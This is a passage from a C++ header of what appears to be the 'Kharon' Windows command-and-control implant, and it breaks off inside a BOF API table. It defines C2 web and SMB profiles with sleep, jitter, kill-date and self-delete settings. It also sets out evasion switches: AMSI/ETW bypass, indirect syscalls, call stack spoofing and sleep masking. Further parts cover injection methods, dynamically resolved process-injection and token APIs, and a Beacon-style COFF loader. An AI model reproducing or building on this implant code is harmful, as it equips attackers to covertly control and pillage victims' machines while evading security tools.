#ifndef KHARON_H
#define KHARON_H

#include <windows.h>
#include <ntstatus.h>
#include <guiddef.h>
#include <winsock.h>
#include <ktmw32.h>
#include <stdio.h>
#include <aclapi.h>
#include <ws2tcpip.h>

namespace mscorlib {
    #include <Mscoree.hh>
}

#include <Clr.h>

#ifdef   WEB_WINHTTP
#include <winhttp.h>
#else
#include <wininet.h>
#endif

#include <KhError.h>
#include <Win32.h>
#include <Defines.h>
#include <Evasion.h>
#include <Misc.h>
#include <Communication.h>

EXTERN_C UPTR StartPtr();
EXTERN_C UPTR EndPtr();

/* ========= [ Config ] ========= */

#define PROFILE_SMB 0x15
#define PROFILE_WEB 0x25

#define KH_JOB_TERMINATE  0x010
#define KH_JOB_SUSPENDED  0x100
#define KH_JOB_RUNNING    0x200
#define KH_JOB_PRE_START  0x300

#define KH_CHUNK_SIZE 512000 // 512 KB

#ifndef KH_AGENT_UUID
#define KH_AGENT_UUID ""
#endif // KH_AGENT_UUID

#ifndef KH_SLEEP_TIME
#define KH_SLEEP_TIME 3
#endif // KH_SLEEP_TIME

#ifndef KH_JITTER
#define KH_JITTER 0
#endif // KH_JITTER

#ifndef KH_BOF_HOOK_ENALED
#define KH_BOF_HOOK_ENALED FALSE
#endif // KH_BOF_HOOK_ENALED

#ifndef KH_KILLDATE_ENABLED
#define KH_KILLDATE_ENABLED FALSE
#endif // KH_KILLDATE_ENABLED

#ifndef KH_PROXY_CALL
#define KH_PROXY_CALL FALSE
#endif // KH_PROXY_CALL

#ifndef KH_CALL_STACK_SPOOF
#define KH_CALL_STACK_SPOOF FALSE
#endif // KH_CALL_STACK_SPOOF

#define KH_BYPASS_NONE 0x000
#define KH_BYPASS_ALL  0x100
#define KH_BYPASS_ETW  0x400
#define KH_BYPASS_AMSI 0x700

#ifndef PROFILE_C2
#define PROFILE_C2 0
#endif 

#ifndef KH_HARDWARE_BREAKPOINT_BYPASS_DOTNET
#define KH_HARDWARE_BREAKPOINT_BYPASS_DOTNET KH_BYPASS_NONE
#endif // KH_HARDWARE_BREAKPOINT_BYPASS_DOTNET

#ifndef KH_INDIRECT_SYSCALL_ENABLED
#define KH_INDIRECT_SYSCALL_ENABLED FALSE
#endif // KH_INDIRECT_SYSCALL_ENABLED

#ifndef KH_INJECTION_PE 
#define KH_INJECTION_PE PeReflection
#endif // KH_INJECTION_PE

#ifndef KH_INJECTION_SC
#define KH_INJECTION_SC ScClassic
#endif // KH_INJECTION_SC

#ifndef KH_HEAP_MASK
#define KH_HEAP_MASK FALSE
#endif // KH_HEAP_MASK

#ifndef KH_SLEEP_MASK
#define KH_SLEEP_MASK MaskTimer
#endif // KH_SLEEP_MASK

#ifndef SMB_PIPE_NAME
#define SMB_PIPE_NAME ""
#endif // SMB_PIPE_NAME

#ifndef WEB_HOST
#define WEB_HOST {}
#endif // WEB_HOST

#ifndef WEB_PORT
#define WEB_PORT {}
#endif // WEB_PORT

#ifndef WEB_ENDPOINT
#define WEB_ENDPOINT { L"/data" }
#endif // WEB_ENDPOINT

#ifndef WEB_ENDPOINT_QUANTITY
#define WEB_ENDPOINT_QUANTITY 1
#endif // WEB_ENDPOINT_QUANTITY

#ifndef WEB_USER_AGENT
#define WEB_USER_AGENT L""
#endif // WEB_USER_AGENT

#ifndef WEB_HTTP_HEADERS
#define WEB_HTTP_HEADERS L""
#endif // WEB_HTTP_HEADERS

#ifndef WEB_SECURE_ENABLED
#define WEB_SECURE_ENABLED TRUE
#endif // WEB_SECURE_ENABLED

#ifndef WEB_PROXY_ENABLED
#define WEB_PROXY_ENABLED FALSE
#endif // WEB_PROXY_ENABLED

#ifndef WEB_PROXY_URL
#define WEB_PROXY_URL L""
#endif // WEB_PROXY_URL

class Pivot;
class Coff;
class Beacon;
class Spoof;
class Syscall;
class HwbpEng;
class Jobs;
class Useful;
class Dotnet;
class Memory;
class Mask;
class Injection;
class Package;
class Parser;
class Task;
class Thread;
class Process;
class Heap;
class Library;
class Transport;
class Token;
class Socket;

#define x64_OPCODE_RET			0xC3
#define x64_OPCODE_MOV			0xB8
#define	x64_SYSCALL_STUB_SIZE   0x20

#define G_KHARON Root::Kharon* Self = (Root::Kharon*)NtCurrentPeb()->TelemetryCoverageHeader;

typedef struct {

} BEACON_INFO, *PBEACON_INFO;

typedef struct JOBS {
    PPACKAGE Pkg;
    PPARSER  Psr;

    struct {
        ULONG  ID;
        HANDLE Handle;
    } Thread;

    BOOL     Threaded;
    ULONG    State;
    ULONG    ExitCode;
    PCHAR    UUID;
    ULONG    CmdID;
    struct JOBS* Next;  
} JOBS, *PJOBS;

namespace Root {

    class Kharon {    
    public:
        Pivot*     Pvt;
        Beacon*    Bc;
        Coff*      Cf;
        HwbpEng*   Hw;
        Spoof*     Spf;
        Syscall*   Sys;
        Socket*    Sckt;
        Jobs*      Jbs;
        Useful*    Usf;
        Dotnet*    Dot;
        Library*   Lib;
        Token*     Tkn;
        Heap*      Hp;
        Process*   Ps;
        Thread*    Td;
        Memory*    Mm;
        Task*      Tk;
        Transport* Tsp;
        Mask*      Mk;
        Injection* Inj;
        Parser*    Psr;
        Package*   Pkg;
    
        struct {
            UPTR Handle;

            DECLAPI( vprintf );
            DECLAPI( vsnprintf );
        } Msvcrt = {
            RSL_TYPE( vprintf ),
            RSL_TYPE( vsnprintf ),
        };

        struct {
            ULONG AllocGran;
            ULONG PageSize;
            PCHAR CompName;
            PCHAR UserName;
            PCHAR DomName;
            PCHAR NetBios;
            PCHAR ProcessorName;
            ULONG ProcessorsNbr;
            ULONG AvalRAM;
            ULONG UsedRAM;
            ULONG TotalRAM;
            ULONG PercentRAM;
            BYTE  OsArch;
            ULONG OsMjrV;
            ULONG OsMnrV;
            ULONG ProductType;
            ULONG OsBuild;
        } Machine = {
            .DomName= "N/A"
        };

        struct {
            PCHAR AgentID;
            ULONG SleepTime;
            ULONG Jitter;
            UPTR  HeapHandle;
            ULONG ProcessID;
            ULONG ParentID;
            ULONG ThreadID;
            ULONG ProcessArch;
            PCHAR CommandLine;
            PCHAR ImageName;
            PCHAR ImagePath;
            BOOL  Elevated;
            BOOL  Connected;

            struct {
                BOOL Enabled;
                BOOL SelfDelete; // if true, self delete the process binary of the disk (care should be taken within a grafted process to exclude an accidentally unintended binary.)
                BOOL ExitProc;   // if true exit the process, else exit the thread

                INT16 Day;
                INT16 Month;
                INT16 Year;
            } KillDate;

            struct {
                UPTR Start;
                UPTR Length;
            } Base;        
        } Session = {
            .AgentID    = KH_AGENT_UUID,
            .SleepTime  = KH_SLEEP_TIME * 1000,
            .Jitter     = KH_JITTER,
            .HeapHandle = U_PTR( NtCurrentPeb()->ProcessHeap ),
            .Connected  = FALSE,

            .KillDate = {
                .Enabled    = KH_KILLDATE_ENABLED,
                .SelfDelete = FALSE,
                .ExitProc   = TRUE
            }
        };

        struct {
            UPTR Handle;

            DECLAPI( gethostbyname );
            DECLAPI( WSAGetLastError );
            DECLAPI( inet_ntoa );
            DECLAPI( WSAStartup );
            DECLAPI( WSASocketA );
            DECLAPI( WSACleanup );
            DECLAPI( shutdown );
            DECLAPI( closesocket );
            DECLAPI( getaddrinfo );
            DECLAPI( ntohs );
            DECLAPI( select );
            DECLAPI( send );
            DECLAPI( setsockopt );
            DECLAPI( connect );
            DECLAPI( inet_addr );
            DECLAPI( htons );
            DECLAPI( socket );
            DECLAPI( recv );
            DECLAPI( ioctlsocket );
            DECLAPI( freeaddrinfo );
        } Ws2_32 = {
            RSL_TYPE( gethostbyname ),
            RSL_TYPE( WSAGetLastError ),
            RSL_TYPE( inet_ntoa ),
            RSL_TYPE( WSAStartup ),
            RSL_TYPE( WSASocketA ),
            RSL_TYPE( WSACleanup ),
            RSL_TYPE( shutdown ),
            RSL_TYPE( closesocket ),
            RSL_TYPE( getaddrinfo ),
            RSL_TYPE( ntohs ),
            RSL_TYPE( select ),
            RSL_TYPE( send ),
            RSL_TYPE( setsockopt ),
            RSL_TYPE( connect ),
            RSL_TYPE( inet_addr ),
            RSL_TYPE( htons ),
            RSL_TYPE( socket ),
            RSL_TYPE( recv ),
            RSL_TYPE( ioctlsocket ),
            RSL_TYPE( freeaddrinfo )
        };

        struct {
            UPTR Handle;
    
            DECLAPI( LoadLibraryA ); 
            DECLAPI( GetProcAddress );
            DECLAPI( GetModuleHandleA );
            DECLAPI( GetModuleHandleW );
            DECLAPI( EnumProcessModules );
            DECLAPI( K32GetModuleFileNameExA );
            DECLAPI( GetModuleFileNameW );

            DECLAPI( GetSystemTime );

            DECLAPI( CreateTimerQueueTimer );

            DECLAPI( DuplicateHandle );
            DECLAPI( SetHandleInformation );
            DECLAPI( GetStdHandle );
            DECLAPI( SetStdHandle );

            DECLAPI( GetConsoleWindow );
            DECLAPI( AllocConsole );

            DECLAPI( CreateTransaction );

            DECLAPI( CreateFileA );
            DECLAPI( CreateFileW );
            DECLAPI( CreateFileTransactedA );
            DECLAPI( CreatePipe );
            DECLAPI( GetCurrentDirectoryA );
            DECLAPI( PeekNamedPipe );
            DECLAPI( ConnectNamedPipe );
            DECLAPI( WaitNamedPipeA );
            DECLAPI( CreateNamedPipeA );
            DECLAPI( CreateDirectoryA );
            DECLAPI( DeleteFileA );
            DECLAPI( CopyFileA );
            DECLAPI( MoveFileA );
            DECLAPI( ReadFile );
            DECLAPI( WriteFile );
            DECLAPI( WriteFileEx );
            DECLAPI( SetCurrentDirectoryA );
            DECLAPI( GetFileSize );
            DECLAPI( FileTimeToSystemTime );
            DECLAPI( FindFirstFileA );
            DECLAPI( FindNextFileA );
            DECLAPI( FindClose );
        
            DECLAPI( CreateProcessA );
            DECLAPI( OpenProcess );
            DECLAPI( IsWow64Process );
        
            DECLAPI( GetComputerNameExA );
        
            DECLAPI( TlsAlloc );
            DECLAPI( TlsSetValue );
            DECLAPI( TlsGetValue );
            DECLAPI( TerminateThread );
            DECLAPI( TerminateProcess );
            DECLAPI( OpenThread );
            DECLAPI( ResumeThread );
            DECLAPI( CreateThread );
            DECLAPI( CreateRemoteThread );

            DECLAPI( BaseThreadInitThunk );
        
            DECLAPI( GlobalMemoryStatusEx );
            DECLAPI( GetNativeSystemInfo );
            DECLAPI( FormatMessageA );
        
            DECLAPI( WaitForSingleObject );
            DECLAPI( WaitForSingleObjectEx );

            DECLAPI( LocalAlloc   );
            DECLAPI( LocalReAlloc );
            DECLAPI( LocalFree    );
        
            DECLAPI( SetEvent );

            DECLAPI( VirtualProtect );
            DECLAPI( VirtualProtectEx );
            DECLAPI( VirtualAlloc );
            DECLAPI( VirtualAllocEx );
            DECLAPI( VirtualFreeEx );
            DECLAPI( VirtualFree );
            DECLAPI( WriteProcessMemory );
            DECLAPI( ReadProcessMemory );

            DECLAPI( AddVectoredExceptionHandler );
            DECLAPI( RemoveVectoredContinueHandler );

            DECLAPI( InitializeCriticalSection );
            DECLAPI( EnterCriticalSection );
            DECLAPI( LeaveCriticalSection );
            DECLAPI( DeleteCriticalSection );

            DECLAPI( InitializeProcThreadAttributeList );
            DECLAPI( UpdateProcThreadAttribute );
            DECLAPI( DeleteProcThreadAttributeList );
        } Krnl32 = {
            RSL_TYPE( LoadLibraryA ),
            RSL_TYPE( GetProcAddress ),
            RSL_TYPE( GetModuleHandleA ),
            RSL_TYPE( GetModuleHandleW ),
            RSL_TYPE( EnumProcessModules ),
            RSL_TYPE( K32GetModuleFileNameExA ),
            RSL_TYPE( GetModuleFileNameW ),

            RSL_TYPE( GetSystemTime ),

            RSL_TYPE( CreateTimerQueueTimer ),

            RSL_TYPE( DuplicateHandle ),
            RSL_TYPE( SetHandleInformation ),
            RSL_TYPE( GetStdHandle ),
            RSL_TYPE( SetStdHandle ),

            RSL_TYPE( GetConsoleWindow ),
            RSL_TYPE( AllocConsole ),
        
            RSL_TYPE( CreateTransaction ),

            RSL_TYPE( CreateFileA ),
            RSL_TYPE( CreateFileW ),
            RSL_TYPE( CreateFileTransactedA ),
            RSL_TYPE( CreatePipe ),
            RSL_TYPE( GetCurrentDirectoryA ),
            RSL_TYPE( PeekNamedPipe ),
            RSL_TYPE( ConnectNamedPipe ),
            RSL_TYPE( WaitNamedPipeA ),
            RSL_TYPE( CreateNamedPipeA ),
            RSL_TYPE( CreateDirectoryA ),
            RSL_TYPE( DeleteFileA ),
            RSL_TYPE( CopyFileA ),
            RSL_TYPE( MoveFileA ),
            RSL_TYPE( ReadFile ),
            RSL_TYPE( WriteFile ),
            RSL_TYPE( WriteFileEx ),
            RSL_TYPE( SetCurrentDirectoryA ),
            RSL_TYPE( GetFileSize ),
            RSL_TYPE( FileTimeToSystemTime ),
            RSL_TYPE( FindFirstFileA ),
            RSL_TYPE( FindNextFileA ),
            RSL_TYPE( FindClose ),
        
            RSL_TYPE( CreateProcessA ),
            RSL_TYPE( OpenProcess ),
            RSL_TYPE( IsWow64Process ),
        
            RSL_TYPE( GetComputerNameExA ),
        
            RSL_TYPE( TlsAlloc ),
            RSL_TYPE( TlsSetValue ),
            RSL_TYPE( TlsGetValue ),
            RSL_TYPE( TerminateThread ),
            RSL_TYPE( TerminateProcess ),
            RSL_TYPE( OpenThread ),
            RSL_TYPE( ResumeThread ),
            RSL_TYPE( CreateThread ),
            RSL_TYPE( CreateRemoteThread ),
        
            RSL_TYPE( BaseThreadInitThunk ),

            RSL_TYPE( GlobalMemoryStatusEx ),
            RSL_TYPE( GetNativeSystemInfo ),
            RSL_TYPE( FormatMessageA ),
        
            RSL_TYPE( WaitForSingleObject ),
            RSL_TYPE( WaitForSingleObjectEx ),

            RSL_TYPE( LocalAlloc   ),
            RSL_TYPE( LocalReAlloc ),
            RSL_TYPE( LocalFree    ),

            RSL_TYPE( SetEvent ),
        
            RSL_TYPE( VirtualProtect ),
            RSL_TYPE( VirtualProtectEx ),
            RSL_TYPE( VirtualAlloc ),
            RSL_TYPE( VirtualAllocEx ),
            RSL_TYPE( VirtualFreeEx ),
            RSL_TYPE( VirtualFree ),
            RSL_TYPE( WriteProcessMemory ),
            RSL_TYPE( ReadProcessMemory ),

            RSL_TYPE( AddVectoredExceptionHandler ),
            RSL_TYPE( RemoveVectoredContinueHandler ),

            RSL_TYPE( InitializeCriticalSection ),
            RSL_TYPE( EnterCriticalSection ),
            RSL_TYPE( LeaveCriticalSection ),
            RSL_TYPE( DeleteCriticalSection ),

            RSL_TYPE( InitializeProcThreadAttributeList ),
            RSL_TYPE( UpdateProcThreadAttribute ),
            RSL_TYPE( DeleteProcThreadAttributeList )
        };

        struct {
            UPTR Handle;

            DECLAPI( RtlNtStatusToDosError );
            DECLAPI( DbgPrint );
            DECLAPI( NtClose );
    
            DECLAPI( NtAllocateVirtualMemory );
            DECLAPI( NtWriteVirtualMemory );
            DECLAPI( NtFreeVirtualMemory );
            DECLAPI( NtProtectVirtualMemory );
            DECLAPI( NtCreateSection );
            DECLAPI( NtMapViewOfSection );

            DECLAPI( khRtlFillMemory );

            DECLAPI( LdrGetProcedureAddress );
    
            DECLAPI( NtOpenProcess );
            DECLAPI( NtCreateThreadEx ); 
            DECLAPI( NtOpenThread );
            DECLAPI( RtlExitUserThread );
            DECLAPI( RtlExitUserProcess );

            DECLAPI( RtlUserThreadStart );
    
            DECLAPI( RtlCaptureContext );
            DECLAPI( NtGetContextThread );
            DECLAPI( NtSetContextThread );
            DECLAPI( NtCreateEvent ); 
            DECLAPI( NtSetEvent );
            DECLAPI( NtContinue );
    
            DECLAPI( NtWaitForSingleObject );
            DECLAPI( NtSignalAndWaitForSingleObject );
    
            DECLAPI( NtSetInformationVirtualMemory );
    
            DECLAPI( NtQueryInformationToken );
            DECLAPI( NtQueryInformationProcess );
            DECLAPI( NtQuerySystemInformation );

            DECLAPI( NtTestAlert );
            DECLAPI( NtAlertResumeThread );
            DECLAPI( NtQueueApcThread );

            DECLAPI( RtlAllocateHeap   );
            DECLAPI( RtlReAllocateHeap );
            DECLAPI( RtlFreeHeap       );
    
            DECLAPI( RtlQueueWorkItem );

            DECLAPI( RtlCreateTimer );
            DECLAPI( RtlDeleteTimer );
            DECLAPI( RtlCreateTimerQueue );
            DECLAPI( RtlDeleteTimerQueue );

            DECLAPI( RtlAddFunctionTable );

            DECLAPI( RtlAddVectoredExceptionHandler );
            DECLAPI( RtlAddVectoredContinueHandler );
            DECLAPI( RtlRemoveVectoredContinueHandler );
            DECLAPI( RtlRemoveVectoredExceptionHandler );

            DECLAPI( RtlInitializeCriticalSection );
            DECLAPI( RtlLeaveCriticalSection );
            DECLAPI( RtlEnterCriticalSection );
            DECLAPI( RtlDeleteCriticalSection );
        } Ntdll = {
            RSL_TYPE( RtlNtStatusToDosError ),
            RSL_TYPE( DbgPrint ),
            RSL_TYPE( NtClose ),
    
            RSL_TYPE( NtAllocateVirtualMemory ),
            RSL_TYPE( NtWriteVirtualMemory ),
            RSL_TYPE( NtFreeVirtualMemory ),
            RSL_TYPE( NtProtectVirtualMemory ),
            RSL_TYPE( NtCreateSection ),
            RSL_TYPE( NtMapViewOfSection ),

            RSL_TYPE( khRtlFillMemory ),

            RSL_TYPE( LdrGetProcedureAddress ),
    
            RSL_TYPE( NtOpenProcess ),
            RSL_TYPE( NtCreateThreadEx ),
            RSL_TYPE( NtOpenThread ),
            RSL_TYPE( RtlExitUserThread ),
            RSL_TYPE( RtlExitUserProcess ),

            RSL_TYPE( RtlUserThreadStart ),
    
            RSL_TYPE( RtlCaptureContext ),
            RSL_TYPE( NtGetContextThread ),
            RSL_TYPE( NtSetContextThread ),
            RSL_TYPE( NtCreateEvent ),
            RSL_TYPE( NtSetEvent ),
            RSL_TYPE( NtContinue ),
    
            RSL_TYPE( NtWaitForSingleObject ),
            RSL_TYPE( NtSignalAndWaitForSingleObject ),
    
            RSL_TYPE( NtSetInformationVirtualMemory ),

            RSL_TYPE( NtQueryInformationToken ),
            RSL_TYPE( NtQueryInformationProcess ),
            RSL_TYPE( NtQuerySystemInformation ),
    
            RSL_TYPE( NtTestAlert ),
            RSL_TYPE( NtAlertResumeThread ),
            RSL_TYPE( NtQueueApcThread ),
    
            RSL_TYPE( RtlAllocateHeap   ),
            RSL_TYPE( RtlReAllocateHeap ),
            RSL_TYPE( RtlFreeHeap       ),

            RSL_TYPE( RtlQueueWorkItem ),

            RSL_TYPE( RtlCreateTimer ),
            RSL_TYPE( RtlDeleteTimer ),
            RSL_TYPE( RtlCreateTimerQueue ),
            RSL_TYPE( RtlDeleteTimerQueue ),

            RSL_TYPE( RtlAddFunctionTable ),

            RSL_TYPE( RtlAddVectoredExceptionHandler ),
            RSL_TYPE( RtlAddVectoredContinueHandler ),
            RSL_TYPE( RtlRemoveVectoredContinueHandler ),
            RSL_TYPE( RtlRemoveVectoredExceptionHandler ),

            RSL_TYPE( RtlInitializeCriticalSection ),
            RSL_TYPE( RtlLeaveCriticalSection ),
            RSL_TYPE( RtlEnterCriticalSection ),
            RSL_TYPE( RtlDeleteCriticalSection ),
        };
           
        struct {
            UPTR Handle;

            DECLAPI( CommandLineToArgvW );
        } Shell32 = {
            RSL_TYPE( CommandLineToArgvW ),
        };

        struct {
            UPTR Handle;

            DECLAPI( ShowWindow );
        } User32 = {
            RSL_TYPE( ShowWindow ),
        };

        struct {
            UPTR Handle;

            DECLAPI( VariantClear );
            DECLAPI( VariantInit );
            DECLAPI( SafeArrayCreateVector );
            DECLAPI( SafeArrayCreate );
            DECLAPI( SysAllocString );
            DECLAPI( SafeArrayPutElement );
            DECLAPI( SafeArrayDestroy );
        } Oleaut32 = {
            RSL_TYPE( VariantClear ),
            RSL_TYPE( VariantInit ),
            RSL_TYPE( SafeArrayCreateVector ),
            RSL_TYPE( SafeArrayCreate ),
            RSL_TYPE( SysAllocString ),
            RSL_TYPE( SafeArrayPutElement ),
            RSL_TYPE( SafeArrayDestroy ),
        };

        struct {
            UPTR Handle;
            DECLAPI( LookupAccountSidW );
            DECLAPI( LookupAccountSidA );
            DECLAPI( LookupPrivilegeValueA );
            DECLAPI( LookupPrivilegeNameA );
            DECLAPI( AdjustTokenPrivileges );
            DECLAPI( OpenProcessToken );
            DECLAPI( OpenThreadToken );
            DECLAPI( GetTokenInformation );

            DECLAPI( GetUserNameA );

            DECLAPI( RegOpenKeyExA    );
            DECLAPI( RegQueryValueExA );
            DECLAPI( RegCloseKey      );
        } Advapi32 = {
            RSL_TYPE( LookupAccountSidW ),
            RSL_TYPE( LookupAccountSidA ),
            RSL_TYPE( LookupPrivilegeValueA ),
            RSL_TYPE( LookupPrivilegeNameA ),
            RSL_TYPE( AdjustTokenPrivileges ),
            RSL_TYPE( OpenProcessToken ),
            RSL_TYPE( OpenThreadToken ),
            RSL_TYPE( GetTokenInformation ),

            RSL_TYPE( GetUserNameA ),

            RSL_TYPE( RegOpenKeyExA    ),
            RSL_TYPE( RegQueryValueExA ),
            RSL_TYPE( RegCloseKey      ),
        };

        struct {
            UPTR Handle;

            DECLAPI( SystemFunction040 );
            DECLAPI( SystemFunction041 );
        } Cryptbase = {
            RSL_TYPE( SystemFunction040 ),
            RSL_TYPE( SystemFunction041 ),
        };

        struct {
            UPTR Handle;

            DECLAPI( CLRCreateInstance );
            DECLAPI( LoadLibraryShim );
        } Mscoree = {
            RSL_TYPE( CLRCreateInstance ),
            RSL_TYPE( LoadLibraryShim ),
        };

        struct {
            UPTR Handle;
    
            DECLAPI( InternetOpenW       );
            DECLAPI( InternetConnectW    );
            DECLAPI( HttpOpenRequestW    );
            DECLAPI( InternetSetOptionW  );
            DECLAPI( HttpSendRequestW    );
            DECLAPI( HttpQueryInfoW      );
            DECLAPI( InternetReadFile    );
            DECLAPI( InternetCloseHandle );
        } Wininet = {
            RSL_TYPE( InternetOpenW       ),
            RSL_TYPE( InternetConnectW    ),
            RSL_TYPE( HttpOpenRequestW    ),
            RSL_TYPE( InternetSetOptionW  ),
            RSL_TYPE( HttpSendRequestW    ),
            RSL_TYPE( HttpQueryInfoW      ),
            RSL_TYPE( InternetReadFile    ),
            RSL_TYPE( InternetCloseHandle ),
        };

        struct {

        } Winhttp = {};

        explicit Kharon();

        auto Init(
            VOID
        ) -> VOID;

        auto Start(
            _In_ UPTR Argument
        ) -> VOID;

        VOID InitCoff( Coff* CoffRf ) { Cf = CoffRf; }
        VOID InitHwbp( HwbpEng* HwbpRf ) { Hw = HwbpRf; }
        VOID InitSpoof( Spoof* SpoofRf ) { Spf = SpoofRf; }
        VOID InitSyscall( Syscall* SyscallRf ) { Sys = SyscallRf; }
        VOID InitSocket( Socket* SocketRf ) { Sckt = SocketRf; }
        VOID InitJobs( Jobs* JobsRf ) { Jbs = JobsRf; }
        VOID InitUseful( Useful* UsefulRf ) { Usf = UsefulRf; }
        VOID InitDotnet( Dotnet* DotnetRf ) { Dot = DotnetRf; }
        VOID InitToken( Token* TokenRf ) { Tkn = TokenRf; } 
        VOID InitHeap( Heap* HeapRf ) { Hp = HeapRf; } 
        VOID InitLibrary( Library* LibRf ) { Lib = LibRf; }
        VOID InitThread( Thread* ThreadRf ) { Td = ThreadRf; }
        VOID InitProcess( Process* ProcessRf ) { Ps = ProcessRf; }
        VOID InitTask( Task* TaskRf ) { Tk = TaskRf; }
        VOID InitTransport( Transport* TransportRf ) { Tsp = TransportRf; }
        VOID InitPackage( Package* PackageRf ) { Pkg = PackageRf; }
        VOID InitParser( Parser* ParserRf ) { Psr = ParserRf; }
        VOID InitMask( Mask* MaskRf ) { Mk = MaskRf; }
        VOID InitInjection( Injection* InjectionRf ) { Inj = InjectionRf; }
        VOID InitMemory( Memory* MemoryRf ) { Mm = MemoryRf; }
    };
}

typedef struct {
    ULONG SymHash;
    PVOID SymPtr;
} COFF_API, *PCOFF_API;

typedef struct {
	PCHAR original;
	PCHAR buffer; 
	INT   length;  
	INT   size;     
} DATAP;

typedef struct {
	PCHAR original; 
	PCHAR buffer;   
	INT   length;   
	INT   size;     
} FMTP;

struct _LOAD_CTX {
    UPTR LoadLibraryAPtr;
    UPTR LibraryName;
};

struct _CLR_CTX {
    UPTR CLRCreateInstancePtr;
    UPTR Arg1;
    UPTR Arg2;
    UPTR Arg3;
};

typedef _CLR_CTX CLR_CTX;

typedef _LOAD_CTX LOAD_CTX;

class Spoof {
private:
    Root::Kharon* Self;    
public:
    Spoof( Root::Kharon* KharonRf ) : Self( KharonRf ) {}

    BOOL Enabled   = KH_CALL_STACK_SPOOF;
    BOOL ProxyCall = KH_PROXY_CALL;

    struct {
        UPTR FirstFrame;   // RtlUserThreadStart+0x2c
        UPTR SecondFrame;  // BaseThreadInitThunk+0x17
        UPTR FirstSize;
        UPTR SecondSize;
        UPTR JmpGadget;
        UPTR JmpRef;
        UPTR ArgCount;
        UPTR Args[8];
    } Setup = {
        .FirstFrame  = (UPTR)this->Self->Ntdll.RtlUserThreadStart + 0x2c,
        .SecondFrame = (UPTR)this->Self->Krnl32.BaseThreadInitThunk + 0x17,
    };

    auto TimerCall(
        _In_ UPTR Context,
        _In_ INT8 Identifier
    ) -> LONG;

    auto WorkCall(
        _In_ UPTR Context,
        _In_ INT8 Identifier
    ) -> LONG;

    template <typename... Args>
    auto Call( 
        _In_ UPTR Lib, 
        _In_ UPTR Fnc, 
        Args... args
    );

    auto GetStackSize(
        _In_ UPTR  LibBase,
        _In_ PVOID UnwInfo
    ) -> ULONG;

    auto GetRtmEntry(
        _In_ UPTR LibBase,
        _In_ UPTR FncOffset
    ) -> PIMAGE_RUNTIME_FUNCTION_ENTRY;

    auto CalcFncStack(

    );
};

struct _BOF_OBJ {
    VOID* MmBegin;
    VOID* MmEnd;
    CHAR* UUID;
    ULONG CmdID;

    struct _BOF_OBJ* Next;
};

typedef _BOF_OBJ BOF_OBJ;

class Coff {
public:
    Root::Kharon* Self;   

    Coff( Root::Kharon* KharonRf ) : Self( KharonRf ) {}

    PPACKAGE Pkg = { 0 };

    BOOL Hook = KH_BOF_HOOK_ENALED;

    BOF_OBJ* Node     = nullptr;
    ULONG    ObjCount = 0;

    // todo hooks
    // struct {
    //     UPTR Hash;
    //     UPTR Ptr;
    // } HookTable[10] = {
    //     HookTable[0] = { Hsh::Str( "VirtualAlloc" ), (UPTR)Self->Mm->Alloc },
    //     HookTable[0] = { Hsh::Str( "VirtualAlloc" ), (UPTR)Self->Krnl32.VirtualAllocEx },
    //     HookTable[0] = { Hsh::Str( "VirtualAlloc" ), (UPTR)Self->Krnl32.VirtualProtect },
    //     HookTable[0] = { Hsh::Str( "VirtualAlloc" ), (UPTR)Self->Krnl32.VirtualProtectEx },
    //     HookTable[0] = { Hsh::Str( "VirtualAlloc" ), (UPTR)Self->Krnl32.WriteProcessMemory },
    //     HookTable[0] = { Hsh::Str( "VirtualAlloc" ), (UPTR)Self->Krnl32.ReadProcessMemory },
    //     HookTable[0] = { Hsh::Str( "VirtualAlloc" ), (UPTR)Self->Krnl32.LoadLibraryA },
    //     HookTable[0] = { Hsh::Str( "VirtualAlloc" ), (UPTR)Self->Krnl32.VirtualAlloc },
    // };

    struct {
        UPTR  Hash;
        PVOID Ptr;
    } ApiTable[30] = {        
        ApiTable[0]  = { Hsh::Str("BeaconDataParse"),        reinterpret_cast<PVOID>(&Coff::DataParse) },
        ApiTable[1]  = { Hsh::Str("BeaconDataInt"),          reinterpret_cast<PVOID>(&Coff::DataInt) },
        ApiTable[2]  = { Hsh::Str("BeaconDataExtract"),      reinterpret_cast<PVOID>(&Coff::DataExtract) },
        ApiTable[3]  = { Hsh::Str("BeaconDataShort"),        reinterpret_cast<PVOID>(&Coff::DataShort) },
        ApiTable[4]  = { Hsh::Str("BeaconDataLength"),       reinterpret_cast<PVOID>(&Coff::DataLength) },
        ApiTable[5]  = { Hsh::Str("BeaconOutput"),           reinterpret_cast<PVOID>(&Coff::Output) },
        ApiTable[6]  = { Hsh::Str("BeaconPrintf"),           reinterpret_cast<PVOID>(&Coff::Printf) },
        // ApiTable[7]  = { Hsh::Str("BeaconInformation"),   reinterpret_cast<PVOID>(&Coff::Information) },
        // ApiTable[8]  = { Hsh::Str("BeaconAddValue"),      reinterpret_cast<PVOID>(&Coff::AddValue) },
        // ApiTable[9]  = { Hsh::Str("BeaconGetValue"),      reinterpret_cast<PVOID>(&Coff::GetValue) },
        // ApiTable[10] = { Hsh::Str("BeaconRemoveValue"),   reinterpret_cast<PVOID>(&Coff::RmValue) },
        ApiTable[11] = { Hsh::Str("BeaconVirtualAlloc"),     reinterpret_cast<PVOID>(&Coff::VirtualAlloc) },
        ApiTable[12] = { Hsh::Str("BeaconVirtualProtect"),   reinterpret_cast<PVOID>(&Coff::VirtualProtect) },
        ApiTable[13] = { Hsh::Str("BeaconVirtualAllocEx"),   reinterpret_cast<PVOID>(&Coff::VirtualAllocEx) },
        ApiTable[14] = { Hsh::Str("BeaconVirtualProtectEx"), reinterpret_cast<PVOID>(&Coff::VirtualProtectEx) },
        // ApiTable[15] = { Hsh::Str("BeaconIsAdmin"),       reinterpret_cast<PVOID>(&Coff::IsAdmin) },
        // ApiTable[16] = { Hsh::Str("BeaconRevertToken"),   reinterpret_cast<PVOID>(&Coff::RevertToken) },
        ApiTable[17] = { Hsh::Str("BeaconOpenProcess"),      reinterpret_cast<PVOID>(&Coff::OpenProcess) },
        ApiTable[18] = { Hsh::Str("BeaconOpenThread"),       reinterpret_cast<PVOID>(&Coff::OpenThread) },
        // ApiTable[19] = { Hsh::Str("BeaconGetSpawnTo"),    reinterpret_cast<PVOID>(&Coff::GetSpawn) },
        ApiTable[18] = { Hsh::Str("BeaconFormatAlloc"),      reinterpret_cast<PVOID>(&Coff::FmtAlloc) },
        ApiTable[20] = { Hsh::Str("BeaconFormatAppend"),     reinterpret_cast<PVOID>(&Coff::FmtAppend) },
        ApiTable[21] = { Hsh::Str("BeaconFormatFree"),       reinterpret_cast<PVOID>(&Coff::FmtFree) },
